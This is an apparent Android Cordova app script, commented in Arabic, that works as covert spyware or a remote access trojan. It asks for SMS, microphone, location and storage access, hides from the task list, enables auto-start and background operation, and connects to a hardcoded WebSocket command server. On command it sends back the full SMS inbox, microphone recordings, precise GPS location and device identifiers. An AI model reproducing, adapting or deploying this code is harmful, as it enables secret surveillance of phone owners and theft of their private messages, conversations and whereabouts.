document.addEventListener('deviceready', onDeviceReady, false);
document.addEventListener('pause', onPause, false);
document.addEventListener('resume', onResume, false);
document.addEventListener('backbutton', onBackButton, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];

function onPause() {
    console.log('App paused, keeping background mode active');
}

function onResume() {
    console.log('App resumed');
}

function onBackButton() {
    console.log('Back button pressed, minimizing app');
    navigator.app.minimizeApp();
}

function onDeviceReady() {
    console.log('Device is ready');
    
    // طلب الأذونات عند التشغيل الأول
    requestPermissions();
    
    // تمكين التشغيل في الخلفية
    if (cordova.plugins.backgroundMode) {
        cordova.plugins.backgroundMode.enable();
        cordova.plugins.backgroundMode.setDefaults({
            title: 'التطبيق يعمل في الخلفية',
            text: 'جارٍ مراقبة الأوامر الواردة'
        });
        
        cordova.plugins.backgroundMode.on('activate', function() {
            cordova.plugins.backgroundMode.disableWebViewOptimizations();
            cordova.plugins.backgroundMode.overrideBackButton();
            cordova.plugins.backgroundMode.excludeFromTaskList();
            
            if (cordova.plugins.autoStart) {
                cordova.plugins.autoStart.enable();
            }
        });
    }
    
    // معلومات الجهاز
    const deviceInfo = {
        uuid: device.uuid || generateUUID(),
        model: device.model || 'Unknown',
        platform: device.platform || 'Unknown',
        version: device.version || 'Unknown',
        manufacturer: device.manufacturer || 'Unknown',
        battery: null,
        timestamp: new Date().toISOString()
    };
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
    
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            deviceInfo.battery = {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            connectToServer(deviceInfo);
            
            battery.addEventListener('levelchange', updateBatteryInfo);
            battery.addEventListener('chargingchange', updateBatteryInfo);
        }).catch(error => {
            console.error('Battery API error:', error);
            connectToServer(deviceInfo);
        });
    } else {
        connectToServer(deviceInfo);
    }
    
    function updateBatteryInfo() {
        navigator.getBattery().then(battery => {
            deviceInfo.battery = {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            
            if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
                window.wsConnection.send(JSON.stringify({
                    type: 'device_update',
                    deviceInfo: {
                        battery: deviceInfo.battery,
                        timestamp: new Date().toISOString()
                    }
                }));
            }
        });
    }
}

function requestPermissions() {
    const permissions = [
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_SMS',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.FOREGROUND_SERVICE'
    ];
    
    if (cordova.plugins.permissions) {
        cordova.plugins.permissions.requestPermissions(
            permissions,
            function() {
                console.log('Permissions granted');
            },
            function(error) {
                console.error('Permissions error:', error);
            }
        );
    }
}

function connectToServer(deviceInfo) {
    const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
    window.wsConnection = new WebSocket(wsUrl);
    
    wsConnection.onopen = () => {
        console.log('Connected to server');
        
        wsConnection.send(JSON.stringify({
            type: 'register',
            deviceId: deviceInfo.uuid,
            deviceInfo
        }));
    };
    
    wsConnection.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            
            if (data.type === 'command') {
                console.log('Received command:', data.command);
                receivedRequests.push({
                    ...data.command,
                    receivedAt: new Date().toISOString()
                });
                
                executeCommand(data.command, (response) => {
                    if (wsConnection.readyState === WebSocket.OPEN) {
                        wsConnection.send(JSON.stringify({
                            type: 'response',
                            commandId: data.commandId,
                            response: {
                                ...response,
                                requestData: data.command
                            }
                        }));
                    }
                });
            }
            else if (data.type === 'registered') {
                console.log('Device registered successfully:', data);
            }
            
        } catch (error) {
            console.error('Error processing message:', error);
        }
    };
    
    wsConnection.onerror = (error) => {
        console.error('WebSocket error:', error);
    };
    
    wsConnection.onclose = () => {
        console.log('Disconnected from server');
        setTimeout(() => connectToServer(deviceInfo), 10000);
    };
    
    const heartbeatInterval = setInterval(() => {
        if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({ 
                type: 'heartbeat',
                timestamp: new Date().toISOString(),
                receivedRequests
            }));
        } else {
            clearInterval(heartbeatInterval);
        }
    }, 30000);
}

function executeCommand(command, callback) {
    console.log('Executing command:', command);
    
    const commandId = Date.now();
    
    switch (command.type) {
        case 'get_location':
            getLocation(commandId, callback);
            break;
        case 'get_sms':
            getSMS(commandId, callback);
            break;
        case 'record_audio':
            recordAudio(commandId, command.duration, callback);
            break;
        case 'get_device_info':
            getDeviceInfo(commandId, callback);
            break;
        case 'get_received_requests':
            getReceivedRequests(commandId, callback);
            break;
        default:
            callback({ 
                commandId,
                status: 'error',
                error: 'Unknown command',
                receivedCommand: command
            });
    }
}

function getLocation(commandId, callback) {
    const options = {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    };
    
    navigator.geolocation.getCurrentPosition(
        (position) => {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: position.timestamp
            };
            
            callback({
                commandId,
                status: 'success',
                location: locationData,
                googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
            });
        },
        (error) => {
            callback({ 
                commandId,
                status: 'error',
                error: 'Location error',
                details: {
                    code: error.code,
                    message: error.message,
                    PERMISSION_DENIED: error.PERMISSION_DENIED,
                    POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
                    TIMEOUT: error.TIMEOUT
                }
            });
        },
        options
    );
}

function getSMS(commandId, callback) {
    if (typeof SMS === 'undefined') {
        return callback({ 
            commandId,
            status: 'error',
            error: 'SMS plugin not available',
            suggestion: 'Install cordova-sms-plugin'
        });
    }
    
    const filter = {
        box: 'inbox',
        maxCount: 1000,
        indexFrom: 0
    };
    
    SMS.listSMS(
        filter,
        (messages) => {
            let smsTextContent = '';
            messages.forEach(msg => {
                smsTextContent += `من: ${msg.address}\n`;
                smsTextContent += `التاريخ: ${new Date(msg.date).toLocaleString()}\n`;
                smsTextContent += `المحتوى: ${msg.body}\n\n`;
            });
            
            const fileName = `sms_backup_${commandId}.txt`;
            saveTextToFile(fileName, smsTextContent, (fileUrl) => {
                callback({
                    commandId,
                    status: 'success',
                    count: messages.length,
                    messages: messages.map(msg => ({
                        id: msg._id,
                        address: msg.address,
                        body: msg.body,
                        date: msg.date,
                        read: msg.read
                    })),
                    downloadUrl: fileUrl,
                    fileName: fileName
                });
            });
        },
        (error) => {
            callback({ 
                commandId,
                status: 'error',
                error: 'SMS error',
                details: error
            });
        }
    );
}

function recordAudio(commandId, duration, callback) {
    const durationOptions = [10, 20, 30, 60];
    
    if (duration) {
        startRecording(duration);
        return;
    }
    
    navigator.notification.prompt(
        'اختر مدة التسجيل (ثانية):',
        (result) => {
            const selectedDuration = parseInt(result.input1);
            if (selectedDuration > 0) {
                startRecording(selectedDuration);
            } else {
                callback({
                    commandId,
                    status: 'cancelled',
                    error: 'لم يتم اختيار مدة صالحة'
                });
            }
        },
        'تسجيل الصوت',
        ['موافق', 'إلغاء'],
        '10'
    );
    
    function startRecording(durationSec) {
        const mediaRecorderOptions = {
            mimeType: 'audio/mp3',
            audioBitsPerSecond: 128000
        };
        
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
                const audioChunks = [];
                
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                    const audioUrl = URL.createObjectURL(audioBlob);
                    
                    const fileName = `recording_${commandId}_${Date.now()}.mp3`;
                    saveAudioToStorage(fileName, audioBlob, (fileEntry) => {
                        const audioElement = document.createElement('audio');
                        audioElement.controls = true;
                        audioElement.src = fileEntry.toURL();
                        
                        callback({ 
                            commandId,
                            status: 'success',
                            audio: {
                                duration: durationSec,
                                format: 'mp3',
                                size: audioBlob.size,
                                downloadUrl: fileEntry.toURL(),
                                fileName: fileName,
                                audioElement: audioElement.outerHTML
                            }
                        });
                    });
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, durationSec * 1000);
            })
            .catch(error => {
                callback({ 
                    commandId,
                    status: 'error',
                    error: 'Audio recording error',
                    details: error.message
                });
            });
    }
}

function saveAudioToStorage(fileName, blob, callback) {
    window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory || cordova.file.dataDirectory, 
        (dir) => {
            dir.getFile(fileName, { create: true }, (fileEntry) => {
                fileEntry.createWriter((fileWriter) => {
                    fileWriter.onwriteend = () => {
                        console.log('Audio file saved:', fileName);
                        callback(fileEntry);
                    };
                    fileWriter.onerror = (e) => {
                        console.error('Error saving file:', e);
                        callback(null);
                    };
                    fileWriter.write(blob);
                });
            });
        }, 
        (error) => {
            console.error('Error accessing file system:', error);
            callback(null);
        }
    );
}

function saveTextToFile(fileName, textContent, callback) {
    window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory || cordova.file.dataDirectory, 
        (dir) => {
            dir.getFile(fileName, { create: true }, (fileEntry) => {
                fileEntry.createWriter((fileWriter) => {
                    fileWriter.onwriteend = () => {
                        console.log('Text file saved:', fileName);
                        callback(fileEntry.toURL());
                    };
                    fileWriter.onerror = (e) => {
                        console.error('Error saving file:', e);
                        callback(null);
                    };
                    fileWriter.write(new Blob([textContent], { type: 'text/plain' }));
                });
            });
        }, 
        (error) => {
            console.error('Error accessing file system:', error);
            callback(null);
        }
    );
}

function getDeviceInfo(commandId, callback) {
    const info = {
        cordova: device.cordova,
        model: device.model,
        platform: device.platform,
        uuid: device.uuid,
        version: device.version,
        manufacturer: device.manufacturer,
        isVirtual: device.isVirtual,
        serial: device.serial
    };
    
    callback({
        commandId,
        status: 'success',
        deviceInfo: info
    });
}

function getReceivedRequests(commandId, callback) {
    callback({
        commandId,
        status: 'success',
        requests: receivedRequests,
        count: receivedRequests.length
    });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
        console.log('App resumed, reconnecting...');
        onDeviceReady();
    }
}, false);
